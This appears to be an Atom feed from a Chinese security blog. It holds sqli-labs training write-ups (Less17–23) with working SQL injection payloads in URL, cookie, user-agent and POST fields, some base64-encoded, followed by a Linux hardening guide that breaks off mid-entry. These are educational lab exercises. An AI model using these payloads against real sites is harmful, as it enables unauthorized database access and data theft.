<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hzktester`s Blog</title>
  
  
  <link href="https://hzktester.top/atom.xml" rel="self"/>
  
  <link href="https://hzktester.top/"/>
  <updated>2020-10-20T09:21:51.043Z</updated>
  <id>https://hzktester.top/</id>
  
  <author>
    <name>hzktester</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sqli-labs靶场Less23（过滤了注释符的绕过）</title>
    <link href="https://hzktester.top/posts/13aa761f.html"/>
    <id>https://hzktester.top/posts/13aa761f.html</id>
    <published>2020-10-20T07:48:00.000Z</published>
    <updated>2020-10-20T09:21:51.043Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less23"><a href="#Less23" class="headerlink" title="Less23"></a>Less23</h2><p>本关对<code>id</code>参数过滤了<code>#</code>和<code>--</code>的处理。但是还可以使用闭合的方式来注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,@@datadir,&#39;3</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102009.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Less23&quot;&gt;&lt;a href=&quot;#Less23&quot; class=&quot;headerlink&quot; title=&quot;Less23&quot;&gt;&lt;/a&gt;Less23&lt;/h2&gt;&lt;p&gt;本关对&lt;code&gt;id&lt;/code&gt;参数过滤了&lt;code&gt;#&lt;/code&gt;和&lt;code&gt;--&lt;/code&gt;的处理。但是还可以使用闭合的方式来注入&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;?id&amp;#x3D;-1&amp;#39; union select 1,@@datadir,&amp;#39;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102009.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
</summary>
    
    
    
    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs靶场Less20、21、22(cookie注入)</title>
    <link href="https://hzktester.top/posts/eb6bd74b.html"/>
    <id>https://hzktester.top/posts/eb6bd74b.html</id>
    <published>2020-10-20T06:59:00.000Z</published>
    <updated>2020-10-20T09:21:51.042Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less20"><a href="#Less20" class="headerlink" title="Less20"></a>Less20</h2><p>从源代码中我们可以看到 <code>cookie</code> 从 <code>username</code> 中获得值后，当再次刷新时，会从 <code>cookie</code> 中读<br>取 <code>username</code>，然后进行查询。<br>登录成功后，我们修改 <code>cookie</code>，再次刷新时，这时候 <code>sql</code> 语句就会被修改了</p><p>先使用正确的账号密码登录一次。使用burp抓取第二个数据包。修改<code>cookie</code>的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102006.png" alt="image"></p><h2 id="Less21"><a href="#Less21" class="headerlink" title="Less21"></a>Less21</h2><p>与Less20处理流程一样，但是对cookie进行了<code>base64</code>加密。利用Less20的方法，但是需要将<code>payload</code>进行<code>base64</code>编码处理（这里对uname进行了<code>(&#39;uname&#39;)</code>处理）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nKWFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAYmFzZWRpciksMHg3ZSkpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102007.png" alt="image"></p><h2 id="Less22"><a href="#Less22" class="headerlink" title="Less22"></a>Less22</h2><p>本关和Less20、Less21是一致的，但是<code>uname</code>进行了<code>&quot;uname&quot;</code>的处理<br>构造<code>payload</code>:<code>admin&quot;and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code></p><p><code>payload</code>进行<code>base64</code>编码后，修改<code>cookie</code>再进行提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSkpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102008.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Less20&quot;&gt;&lt;a href=&quot;#Less20&quot; class=&quot;headerlink&quot; title=&quot;Less20&quot;&gt;&lt;/a&gt;Less20&lt;/h2&gt;&lt;p&gt;从源代码中我们可以看到 &lt;code&gt;cookie&lt;/code&gt; 从 &lt;code&gt;username&lt;/code&gt; 中获得值后，当再次刷新时，会从 &lt;code&gt;cookie&lt;/code&gt; 中读&lt;br&gt;取 &lt;code&gt;username&lt;/code&gt;，然后进行查询。&lt;br&gt;登录成功后，我们修改 &lt;code&gt;cookie&lt;/code&gt;，再次刷新时，这时候 &lt;code&gt;sql&lt;/code&gt; 语句就会被修改了&lt;/p&gt;
&lt;p&gt;先使用正确的账号密码登录一次。使用burp抓取第二个数据包。修改&lt;code&gt;cookie&lt;/code&gt;的值&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#39; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102006.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Less21&quot;&gt;&lt;a href=&quot;#Less21&quot; class=&quot;headerlink&quot; title=&quot;Less21&quot;&gt;&lt;/a&gt;Less21&lt;/h2&gt;&lt;p&gt;与Less20处理流程一样，但是对cookie进行了&lt;code&gt;base64&lt;/code&gt;加密。利用Less20的方法，但是需要将&lt;code&gt;payload&lt;/code&gt;进行&lt;code&gt;base64&lt;/code&gt;编码处理（这里对uname进行了&lt;code&gt;(&amp;#39;uname&amp;#39;)&lt;/code&gt;处理）&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;YWRtaW4nKWFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAYmFzZWRpciksMHg3ZSkpIw&amp;#x3D;&amp;#x3D;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102007.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Less22&quot;&gt;&lt;a href=&quot;#Less22&quot; class=&quot;headerlink&quot; title=&quot;Less22&quot;&gt;&lt;/a&gt;Less22&lt;/h2&gt;</summary>
    
    
    
    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs靶场Less-19(referer注入)</title>
    <link href="https://hzktester.top/posts/588aed09.html"/>
    <id>https://hzktester.top/posts/588aed09.html</id>
    <published>2020-10-20T06:34:00.000Z</published>
    <updated>2020-10-20T09:21:51.039Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less19"><a href="#Less19" class="headerlink" title="Less19"></a>Less19</h2><p>本关和Less18基本是一致的，只不过是<code>referer</code>处存在注入</p><p>使用burp抓包修改<code>referer</code></p><p><img src="https://qiniu.hzktester.top/tp2020102005.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Less19&quot;&gt;&lt;a href=&quot;#Less19&quot; class=&quot;headerlink&quot; title=&quot;Less19&quot;&gt;&lt;/a&gt;Less19&lt;/h2&gt;&lt;p&gt;本关和Less18基本是一致的，只不过是&lt;code&gt;referer&lt;/code&gt;处存在注入&lt;/p&gt;
&lt;p&gt;使用burp抓包修改&lt;code&gt;referer&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102005.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
</summary>
    
    
    
    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs靶场Less-18(useragent注入)</title>
    <link href="https://hzktester.top/posts/e9f63d2e.html"/>
    <id>https://hzktester.top/posts/e9f63d2e.html</id>
    <published>2020-10-20T06:23:00.000Z</published>
    <updated>2020-10-20T09:21:51.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less18"><a href="#Less18" class="headerlink" title="Less18"></a>Less18</h2><p>本关可以从源码了解到对<code>uname</code>和<code>passwd</code>进行了<code>check_input()</code>函数的处理，所以这里无法注入了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname &#x3D; check_input($_POST[&#39;uname&#39;]);</span><br><span class="line">$passwd &#x3D; check_input($_POST[&#39;passwd&#39;]);</span><br></pre></td></tr></table></figure><p>但是代码中将<code>useragent</code>和<code>ip</code>插入到数据库中，可以使用<code>useragent</code>进行注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)</span><br></pre></td></tr></table></figure><p>使用burp抓包修改<code>useragent</code>看看</p><p><img src="https://qiniu.hzktester.top/tp2020102003.png" alt="image"></p><p>修改<code>useragent</code>报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102004.png" alt="image"></p><p>可以看到已经得到版本号了</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Less18&quot;&gt;&lt;a href=&quot;#Less18&quot; class=&quot;headerlink&quot; title=&quot;Less18&quot;&gt;&lt;/a&gt;Less18&lt;/h2&gt;&lt;p&gt;本关可以从源码了解到对&lt;code&gt;uname&lt;/code&gt;和&lt;code&gt;passwd&lt;/code&gt;进行了&lt;code&gt;check_input()&lt;/code&gt;函数的处理，所以这里无法注入了。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$uname &amp;#x3D; check_input($_POST[&amp;#39;uname&amp;#39;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$passwd &amp;#x3D; check_input($_POST[&amp;#39;passwd&amp;#39;]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是代码中将&lt;code&gt;useragent&lt;/code&gt;和&lt;code&gt;ip&lt;/code&gt;插入到数据库中，可以使用&lt;code&gt;useragent&lt;/code&gt;进行注入&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;INSERT INTO &amp;#96;security&amp;#96;.&amp;#96;uagents&amp;#96; (&amp;#96;uagent&amp;#96;, &amp;#96;ip_address&amp;#96;, &amp;#96;username&amp;#96;) VALUES (&amp;#39;$uagent&amp;#39;, &amp;#39;$IP&amp;#39;, $uname)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用burp抓包修改&lt;code&gt;useragent&lt;/code&gt;看看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102003.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;修改&lt;code&gt;useragent&lt;/code&gt;报错注入&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &amp;#39;1&amp;#39;&amp;#x3D;&amp;#39;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102004.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs靶场Less-17(update注入)</title>
    <link href="https://hzktester.top/posts/cb3a4153.html"/>
    <id>https://hzktester.top/posts/cb3a4153.html</id>
    <published>2020-10-20T03:27:00.000Z</published>
    <updated>2020-10-20T09:21:51.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less17"><a href="#Less17" class="headerlink" title="Less17"></a>Less17</h2><p>本关可以看到是一个修改密码的过程，利用的是<code>update</code>语句，与再用<code>select</code>时是一样的。</p><p>尝试报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;11&#39;&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>可以看到<code>sql</code>语句报错</p><p><img src="https://qiniu.hzktester.top/tp2020102001.png" alt="image"></p><p>尝试一下报错注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;11&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102002.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Less17&quot;&gt;&lt;a href=&quot;#Less17&quot; class=&quot;headerlink&quot; title=&quot;Less17&quot;&gt;&lt;/a&gt;Less17&lt;/h2&gt;&lt;p&gt;本关可以看到是一个修改密码的过程，利用的是&lt;code&gt;update&lt;/code&gt;语句，与再用&lt;code&gt;select&lt;/code&gt;时是一样的。&lt;/p&gt;
&lt;p&gt;尝试报错：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;uname&amp;#x3D;admin&amp;amp;passwd&amp;#x3D;11&amp;#39;&amp;amp;submit&amp;#x3D;Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到&lt;code&gt;sql&lt;/code&gt;语句报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102001.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;尝试一下报错注入：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;uname&amp;#x3D;admin&amp;amp;passwd&amp;#x3D;11&amp;#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;amp;submit&amp;#x3D;Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102002.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
</summary>
    
    
    
    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>linux操作系统加固</title>
    <link href="https://hzktester.top/posts/61d5f45a.html"/>
    <id>https://hzktester.top/posts/61d5f45a.html</id>
    <published>2020-10-15T06:29:00.000Z</published>
    <updated>2020-10-20T09:21:51.044Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux系统基本操作"><a href="#Linux系统基本操作" class="headerlink" title="Linux系统基本操作"></a>Linux系统基本操作</h1><h2 id="文件结构图及关键文件功能"><a href="#文件结构图及关键文件功能" class="headerlink" title="文件结构图及关键文件功能"></a>文件结构图及关键文件功能</h2><h3 id="Linux文件结构"><a href="#Linux文件结构" class="headerlink" title="Linux文件结构"></a>Linux文件结构</h3><p><img src="https://qiniu.hzktester.top/tp2020101501.png" alt="image"></p><h3 id="Linux文件结构图"><a href="#Linux文件结构图" class="headerlink" title="Linux文件结构图"></a>Linux文件结构图</h3><p><img src="https://qiniu.hzktester.top/tp2020101502.png" alt="image"></p><h3 id="二级目录"><a href="#二级目录" class="headerlink" title="二级目录"></a>二级目录</h3><table><thead><tr><th>目录</th><th>功能</th></tr></thead><tbody><tr><td>/bin</td><td>放置的是在单人维护模式下能够被操作的指令，在/bin底下的指令可以被root与 一般账号所使用</td></tr><tr><td>/boot</td><td>这个目录只要在放置开机会使用到的文件，包括Linux核心文件以及开机选单与 开机所需配置的文件等等</td></tr><tr><td>/dev</td><td>在Linux系统上，任何装置与接口设备都是以文件的形态存在于这个目录当中的</td></tr><tr><td>/etc</td><td>系统主要的配置文件几乎都放置在这个目录内，例如人员的账号密码文件，各 种服务的启动档，系统变量配置等</td></tr><tr><td>/home</td><td>这是系统默认的用户家目录(homedirectory)</td></tr><tr><td>/lib</td><td>/lib放置的则是在开机时会用到的函式库，以及在/lib或/sbin底下的指令会呼叫 的函式库</td></tr><tr><td>/media</td><td>/media底下放置的是可移出的装置，包括软盘、光盘、DVD等等装置都杂事挂载与此</td></tr><tr><td>/opt</td><td>给第三方协议软件放置的目录</td></tr><tr><td>/root</td><td>系统管理员（root）的家目录</td></tr><tr><td>/sbin</td><td>放置/sbin底下的为开机过程中所需要的，里面包括了开机、修复、还原系统所 需要的指令。</td></tr><tr><td>/srv</td><td>srv可视为[service]的缩写，是一些网络服务启动之后，这些服务所需要取用的 数据目录</td></tr><tr><td>/tmp</td><td>这是让一般使用者或者是正在执行的程序暂时放置文件的地方</td></tr></tbody></table><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><table><thead><tr><th>目录</th><th>功能</th></tr></thead><tbody><tr><td>/etc/passwd</td><td>记录系统本地用户的属性信息，如UId,Gid,家目录等信息</td></tr><tr><td>/etc/shadow</td><td>存放用户的口令等信息，只有系统管理员用户能查看</td></tr><tr><td>/etc/pam.d/system-auth</td><td>账户安全配置文件</td></tr><tr><td>/etc/login.defs</td><td>设置用户账户限制的配置文件，对root用户无效</td></tr><tr><td>/etc/securetty</td><td>网络配置文件</td></tr><tr><td>/etc/pam.d/su</td><td>su命令配置</td></tr><tr><td>/etc/hosts.allow、/etc/hosts.deny</td><td>允许/拒接某网段远程连接到主机</td></tr><tr><td>/etc/profile</td><td>保存Linux全局环境变量信息，如umask,bash历史命令设置</td></tr></tbody></table><h2 id="账号管理"><a href="#账号管理" class="headerlink" title="账号管理"></a>账号管理</h2><h3 id="账号分类："><a href="#账号分类：" class="headerlink" title="账号分类："></a>账号分类：</h3><p>超级管理员  uid=0</p><p>系统默认用户    系统程序使用，从不登录</p><p>新建普通用户    uid大于500</p><p><img src="https://qiniu.hzktester.top/tp2020101503.png" alt="image"></p><h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p><img src="https://qiniu.hzktester.top/tp2020101504.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">head -1 &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">字段1：用户账号的名称</span><br><span class="line">字段2：密码字符串或占位符x</span><br><span class="line">字段3：用户账号的UID号</span><br><span class="line">字段4：所属基本组的GID号</span><br><span class="line">字段5：用户全名</span><br><span class="line">字段6：宿主目录</span><br><span class="line">字段7：登录shell程序的路径</span><br></pre></td></tr></table></figure><h3 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h3><p><img src="https://qiniu.hzktester.top/tp2020101505.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">head -1 &#x2F;etc&#x2F;shadow</span><br><span class="line"></span><br><span class="line">字段1：用户账号的名称</span><br><span class="line">字段2：加密后的密码字符串</span><br><span class="line">子段3：上次修改密码的时间</span><br><span class="line">字段4：密码的最短有效天数，默认0</span><br><span class="line">字段5：密码的最长有效天数，默认99999</span><br><span class="line">字段6：密码过期前的警告天数，默认7</span><br><span class="line">字段7：密码过期后多少天禁用此用户账号</span><br><span class="line">字段8：账号失效时间，默认值为空</span><br><span class="line">字段9：保留字段（未使用）</span><br></pre></td></tr></table></figure><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">useradd test        &#x2F;&#x2F;添加用户test</span><br><span class="line">passwd test         &#x2F;&#x2F;为test用户设置密码</span><br><span class="line">passwd -l test      &#x2F;&#x2F;锁定用户test</span><br><span class="line">passwd -u test      &#x2F;&#x2F;解锁用户test</span><br><span class="line">userdel -r test    &#x2F;&#x2F;删除用户test</span><br><span class="line">id                  &#x2F;&#x2F;查看当前用户</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101506.png" alt="image"></p><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h3 id="查看权限：ls-l"><a href="#查看权限：ls-l" class="headerlink" title="查看权限：ls -l"></a>查看权限：<code>ls -l</code></h3><p>下图中文件所有者(属主)为root，所有组(属组)为root，文件名为<code>install.log</code>,权限为的第一个减号“-”代表的是文件类型：</p><p>-：普通文件，d:目录文件，l:链接文件，b:设备文件，c:字符设备文件，p:管道文件<br><img src="https://qiniu.hzktester.top/tp2020101507.png" alt="image"></p><p>读(read)，写(write)，执行r(recute)简写即为(r,w,x),亦可用数字来(4,2,1)表示</p><p><img src="https://qiniu.hzktester.top/tp2020101508.png" alt="image"></p><h3 id="修改权限：chown"><a href="#修改权限：chown" class="headerlink" title="修改权限：chown"></a>修改权限：<code>chown</code></h3><p>chown命令是用于更改文件的用户和组的所有权。要将文件 foo 的用户和组的所有权更改为 root，可以使用以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1）chown root:root foo</span><br><span class="line">2）chown root: foo</span><br></pre></td></tr></table></figure><p>在用户名后跟冒号【: 】运行该命令将同时设置用户和组所有权。</p><p>要仅将文件 foo 的用户所有权设置为 root 用户，操作命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown root foo</span><br></pre></td></tr></table></figure><p>要仅更改文件 foo 的组所有权，则需要在组之前加冒号，操作命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown :root foo</span><br></pre></td></tr></table></figure><h3 id="初始文件权限：UMASK"><a href="#初始文件权限：UMASK" class="headerlink" title="初始文件权限：UMASK"></a>初始文件权限：<code>UMASK</code></h3><p>这篇文章写的很详细，可以参考一下</p><p><a href="https://www.cnblogs.com/wang-shishuang/p/10458875.html">https://www.cnblogs.com/wang-shishuang/p/10458875.html</a></p><h1 id="系统加固"><a href="#系统加固" class="headerlink" title="系统加固"></a>系统加固</h1><h2 id="锁定系统中多余的自建账号"><a href="#锁定系统中多余的自建账号" class="headerlink" title="锁定系统中多余的自建账号"></a>锁定系统中多余的自建账号</h2><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">cat &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure><blockquote><p>查看账户、口令文件，与系统管理员确认不必要的账号。对于一些保留的系统伪帐户如：bin,sys,adm,uucp,lp,nuucp,hpdb,www,daemon等可根据需要锁定登陆。</p></blockquote><p>加固方法：</p><p>使用命令<code>passwd -l &lt;用户名&gt;</code>锁定不必要的账号。</p><p>使用命令<code>passwd -u &lt;用户名&gt;</code>解锁需要恢复的账号。</p><h2 id="检查shadow中空口令账号"><a href="#检查shadow中空口令账号" class="headerlink" title="检查shadow中空口令账号"></a>检查shadow中空口令账号</h2><p>检查方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#39;length($2)&#x3D;&#x3D;0 &#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101509.png" alt="image"></p><p>加固方法：<br>使用命令<code>passwd -l &lt;用户名&gt;</code>锁定不必要的账户。<br>使用命令<code>passwd -u &lt;用户名&gt;</code>解锁需要恢复的账户。<br>使用命令<code>passwd &lt;用户名&gt;</code>为用户设置密码。</p><h2 id="设置系统密码策略"><a href="#设置系统密码策略" class="headerlink" title="设置系统密码策略"></a>设置系统密码策略</h2><p>执行命令（查看密码策略设置）:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;login.defs|grep PASS</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101510.png" alt="image"></p><p>加固方法（修改配置文件）：</p><figure class="highlight 